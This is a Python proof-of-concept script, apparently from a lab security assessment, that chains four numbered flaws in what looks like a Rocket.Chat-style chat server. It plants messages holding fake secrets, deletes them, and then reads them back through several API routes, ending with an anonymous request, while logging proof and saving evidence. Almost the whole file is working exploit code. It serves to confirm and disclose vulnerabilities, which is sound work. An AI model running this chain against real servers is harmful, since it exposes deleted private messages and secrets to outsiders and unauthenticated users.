BASE_URL = os.environ.get("BASE_URL", "http://127.0.0.1:39649").rstrip("/")
HERE = os.path.dirname(os.path.abspath(__file__))
_ANSI = _re.compile(r"\x1b\[[0-9;]*m")


class _Tee:
    def __init__(self, term, logf):
        self.term, self.logf = term, logf

    def write(self, s):
        self.term.write(s)
        self.logf.write(_ANSI.sub("", s))

    def flush(self):
        self.term.flush()
        self.logf.flush()


# automation.py writes run.log; any other script writes <its name>.log, so the
# scripts sharing a folder keep their own transcripts.
_ME = os.path.splitext(os.path.basename(os.path.abspath(__file__)))[0]
_logf = open(os.path.join(HERE, "run.log" if _ME == "automation" else _ME + ".log"),
             "w", encoding="utf-8")
_TERM_IS_TTY = sys.__stdout__.isatty() and not os.environ.get("NO_COLOR")
sys.stdout = _Tee(sys.__stdout__, _logf)
sys.stderr = _Tee(sys.__stderr__, _logf)

_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    """One status line: coloured on a live terminal, plain in run.log."""
    if _TERM_IS_TTY and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}", flush=True)
    else:
        print(f"[{tag}] {msg}", flush=True)


def rand(n=4):
    """A short random suffix so accounts, uploads and tokens never collide."""
    return secrets.token_hex(n)


def save(name, text):
    """Write evidence beside the script (request.http, response.txt, ...)."""
    path = os.path.join(HERE, name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def verdict(status, summary):
    """The one standard line a run ends on; returns the process exit code."""
    day = _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%d")
    status = status.strip().upper()
    log("OK" if status == "CONFIRMED" else "FAIL", f"{VULN} {status}")
    print(f"==> {VULN} {status} {day} - {summary}", flush=True)
    return 0 if status == "CONFIRMED" else 1
# --- end preamble ---

ADMIN_USER = os.environ.get("ADMIN_USER", "admin")                 # manifest admin: provisioning only
ADMIN_PASS = os.environ.get("ADMIN_PASS", "Bspdr-Lab-Adm1n!")      # manifest admin password


def api(sess, method, path, **kw):
    return sess.request(method, f"{BASE_URL}{path}", timeout=60, **kw)


def login(username, password):
    s = requests.Session()
    r = api(s, "POST", "/api/v1/login", json={"user": username, "password": password})
    d = r.json()
    if d.get("status") != "success":
        raise RuntimeError(f"login {username} failed: {r.status_code} {r.text[:200]}")
    s.headers.update({"X-Auth-Token": d["data"]["authToken"], "X-User-Id": d["data"]["userId"]})
    return s


def mkuser(adm, name, pw):
    r = api(adm, "POST", "/api/v1/users.create", json={
        "username": name, "name": name, "email": f"{name}@lab.invalid", "password": pw,
        "roles": ["user"], "joinDefaultChannels": False, "verified": False,
        "requirePasswordChange": False})
    if not r.json().get("success"):
        raise RuntimeError(f"could not create {name}: {r.text[:200]}")
    return r.json()["user"]["_id"]


def rmuser(adm, uid):
    api(adm, "POST", "/api/v1/users.delete", json={"userId": uid, "confirmRelinquish": True})


def banner(title):
    print("=" * 72)
    print(f"{VULN}: {title}")
    print(f"target : {BASE_URL}")
    print("author : Blue Spider")
    print("=" * 72)


def tfa():
    return {"x-2fa-method": "password", "x-2fa-code": hashlib.sha256(ADMIN_PASS.encode()).hexdigest()}


def get_setting(adm, sid):
    r = api(adm, "GET", f"/api/v1/settings/{sid}")
    return r.json().get("value") if r.status_code == 200 else None


def set_setting(adm, sid, value):
    old = get_setting(adm, sid)
    api(adm, "POST", f"/api/v1/settings/{sid}", json={"value": value}, headers=tfa())
    return old


def main():
    sfx = rand()
    banner("a deleted message is still readable: by an outsider, by a member, by nobody at all")
    log("INFO", "chaining VULN-010 (the deletion timeline of any room) -> VULN-059 (the hidden "
                "thread root, default install) -> VULN-049 (any deleted message by id, with "
                "history on) -> VULN-047 (the same content with no account)")
    adm = login(ADMIN_USER, ADMIN_PASS)
    pw = f"Lab-Pass-{sfx}!A"
    author, member, outsider = f"author_{sfx}", f"member_{sfx}", f"outsider_{sfx}"
    uids = {n: mkuser(adm, n, pw) for n in (author, member, outsider)}
    sa, sm, so = (login(n, pw) for n in (author, member, outsider))

    # [SETUP] two rooms: a private group the outsider is not in, and a public
    # channel. The outsider holds the default `user` role and nothing else.
    group = api(sa, "POST", "/api/v1/groups.create",
                json={"name": f"legal-{sfx}", "members": [member]}).json()["group"]["_id"]
    chan = api(sa, "POST", "/api/v1/channels.create",
               json={"name": f"general-notes-{sfx}", "members": [member]}).json()["channel"]["_id"]
    log("SETUP", f"{author} owns the private group legal-{sfx} ({group}) and the public channel "
                 f"general-notes-{sfx} ({chan}); {member} is in both, {outsider} is in neither")
    ev = {"group": group, "channel": chan}
    keep_was = anon_was = None

    try:
        # ------------------------------------------------------------- step 1
        # VULN-010: the deletion timeline, from an account with no relationship
        # to either room. The attacker needs only the room id.
        regret = f"regret-{sfx}: wire the retainer to IBAN GB29NWBK{sfx.upper()}"
        gmsg = api(sa, "POST", "/api/v1/chat.postMessage",
                   json={"roomId": group, "text": regret}).json()["message"]["_id"]
        since = _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        time.sleep(1.2)
        api(sa, "POST", "/api/v1/chat.delete", json={"roomId": group, "msgId": gmsg})
        time.sleep(1)
        front = api(so, "GET", f"/api/v1/groups.history?roomId={group}&count=10")
        path = f"/api/v1/chat.getDeletedMessages?roomId={group}&since=1970-01-01T00:00:00.000Z&count=100"
        r1 = api(so, "GET", path)
        ids = [m.get("_id") for m in (r1.json().get("messages") or [])]
        log("STEP", f"1/4 VULN-010: {author} posted and deleted a message in the private group; "
                    f"{outsider} asks for that room's deletions")
        save("request.http", f"GET {path} HTTP/1.1\r\nHost: {BASE_URL.split('//', 1)[1]}\r\n"
                             f"X-Auth-Token: {so.headers['X-Auth-Token']}\r\n"
                             f"X-User-Id: {so.headers['X-User-Id']}\r\nAccept: application/json\r\n\r\n")
        save("response.txt", f"HTTP/1.1 {r1.status_code}\n"
             + "".join(f"{k}: {v}\n" for k, v in r1.headers.items()) + "\n" + r1.text)
        log("PROOF" if gmsg in ids else "FAIL",
            f"    the outsider cannot open the room at all (groups.history -> HTTP "
            f"{front.status_code}) yet chat.getDeletedMessages answers HTTP {r1.status_code} with "
            f"{len(ids)} deletion(s), including the id just deleted ({gmsg in ids})")
        ev["step1_timeline"] = {"history_for_outsider": front.status_code,
                                "deleted_ids": ids, "target_id_disclosed": gmsg in ids}

        # ------------------------------------------------------------- step 2
        # VULN-059: on the shipped configuration, a deleted thread root is kept
        # as a hidden copy and the sync route returns it in full.
        log("STEP", "2/4 VULN-059: a thread root deleted on the default configuration, read back "
                    "by another member through chat.syncThreadsList")
        secret = f"thread-secret-{sfx} api-key=AKIA{sfx.upper()}"
        root = api(sa, "POST", "/api/v1/chat.postMessage",
                   json={"roomId": chan, "text": secret}).json()["message"]["_id"]
        api(sm, "POST", "/api/v1/chat.sendMessage",
            json={"message": {"rid": chan, "msg": "noted", "tmid": root}})
        t0 = _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        time.sleep(1.2)
        api(sa, "POST", "/api/v1/chat.delete", json={"roomId": chan, "msgId": root})
        time.sleep(1.5)
        sync = api(sm, "GET", f"/api/v1/chat.syncThreadsList?rid={chan}&updatedSince={t0}")
        ctl = api(sm, "GET", f"/api/v1/channels.history?roomId={chan}&count=20")
        root_leak = secret in sync.text
        log("PROOF" if root_leak else "FAIL",
            f"    the sync route returns the deleted root's text ({root_leak}) while the room's own "
            f"history withholds it ({secret in ctl.text}), with Message_KeepHistory still at its "
            f"shipped {get_setting(adm, 'Message_KeepHistory')}")
        ev["step2_thread_root"] = {"leaked": root_leak, "in_history": secret in ctl.text,
                                   "keep_history_setting": get_setting(adm, "Message_KeepHistory")}

        # ------------------------------------------------------------- step 3
        # VULN-049: with the history feature on, every deletion keeps a copy and
        # chat.getMessage serves it by id: the id step 1 disclosed.
        keep_was = set_setting(adm, "Message_KeepHistory", True)
        time.sleep(2)
        log("STEP", "3/4 VULN-049: with message edit history on, read an ordinary deleted "
                    "message's text back by its id")
        doomed = f"pasted-by-mistake-{sfx}: prod root password Hunter-{sfx}!"
        dmsg = api(sa, "POST", "/api/v1/chat.postMessage",
                   json={"roomId": chan, "text": doomed}).json()["message"]["_id"]
        time.sleep(0.8)
        api(sa, "POST", "/api/v1/chat.delete", json={"roomId": chan, "msgId": dmsg})
        time.sleep(1.2)
        ids2 = [m.get("_id") for m in (api(so, "GET",
                f"/api/v1/chat.getDeletedMessages?roomId={chan}&since=1970-01-01T00:00:00.000Z"
                f"&count=100").json().get("messages") or [])]
        g = api(sm, "GET", f"/api/v1/chat.getMessage?msgId={dmsg}")
        member_hist = api(sm, "GET", f"/api/v1/channels.history?roomId={chan}&count=20")
        got = doomed in g.text
        log("PROOF" if got else "FAIL",
            f"    chat.getMessage on the deleted id returns its text to a member (HTTP "
            f"{g.status_code}, text present={got}) while the room's own history does not "
            f"({doomed in member_hist.text})")
        log("INFO", f"    and the interaction worth recording: with history keeping on nothing is "
                    f"moved to the trash collection, so the step-1 timeline for this channel is "
                    f"{ids2} (the deleted id present={dmsg in ids2}). The timeline leak and the "
                    f"content leak therefore apply in opposite configurations, and each is enough "
                    f"on its own for the step that follows")
        ev["step3_by_id"] = {"ids_from_outsider": ids2, "id_present": dmsg in ids2,
                             "getMessage": g.status_code, "text_recovered": got,
                             "in_history": doomed in member_hist.text}

        # ------------------------------------------------------------- step 4
        # VULN-047: anonymous read drops the last requirement. No account at all.
        anon_was = set_setting(adm, "Accounts_AllowAnonymousRead", True)
        time.sleep(2)
        log("STEP", "4/4 VULN-047: with anonymous read on, ask for the same channel with no "
                    "credentials whatsoever")
        anon = requests.get(f"{BASE_URL}/api/v1/channels.anonymousread?roomId={chan}&count=100",
                            timeout=60)
        anon_leak = doomed in anon.text or secret in anon.text
        log("PROOF" if anon_leak else "FAIL",
            f"    unauthenticated channels.anonymousread -> HTTP {anon.status_code}; it contains "
            f"the deleted message ({doomed in anon.text}) and the deleted thread root "
            f"({secret in anon.text})")
        save("evidence/anonymous-read-of-deleted.json",
             json.dumps({"status": anon.status_code,
                         "deleted_message_present": doomed in anon.text,
                         "deleted_thread_root_present": secret in anon.text,
                         "excerpt": anon.text[:1500]}, indent=2))
        ev["step4_anonymous"] = {"status": anon.status_code, "deleted_message": doomed in anon.text,
                                 "deleted_root": secret in anon.text}
        save("evidence/chain-008.json", json.dumps(ev, indent=2, default=str))
    finally:
        log("INFO", "cleanup: restoring both settings and deleting the rooms and accounts this run "
                    "created")
        if anon_was is not None:
            set_setting(adm, "Accounts_AllowAnonymousRead", anon_was)
        if keep_was is not None:
            set_setting(adm, "Message_KeepHistory", keep_was)
        api(adm, "POST", "/api/v1/groups.delete", json={"roomId": group})
        api(adm, "POST", "/api/v1/channels.delete", json={"roomId": chan})
        for n in (author, member, outsider):
            rmuser(adm, uids[n])
        log("INFO", f"    settings restored: Message_KeepHistory="
                    f"{get_setting(adm, 'Message_KeepHistory')}, Accounts_AllowAnonymousRead="
                    f"{get_setting(adm, 'Accounts_AllowAnonymousRead')}")

    ok = (ev.get("step1_timeline", {}).get("target_id_disclosed")
          and ev.get("step2_thread_root", {}).get("leaked")
          and ev.get("step3_by_id", {}).get("text_recovered")
          and ev.get("step4_anonymous", {}).get("deleted_message"))
    if ok:
        return verdict("CONFIRMED",
                       "an account with no access to a private group listed that room's deletions, "
                       "a member recovered a deleted thread root's full text on the shipped "
                       "configuration, a member recovered an ordinary deleted message's text by id "
                       "once history keeping was on, and an unauthenticated request returned both "
                       "of those deleted texts once anonymous read was on")
    return verdict("FAILED",
                   f"ids={ev.get('step1_timeline', {}).get('target_id_disclosed')} "
                   f"root={ev.get('step2_thread_root', {}).get('leaked')} "
                   f"by_id={ev.get('step3_by_id', {}).get('text_recovered')} "
                   f"anon={ev.get('step4_anonymous', {}).get('deleted_message')}")


if __name__ == "__main__":
    sys.exit(main())
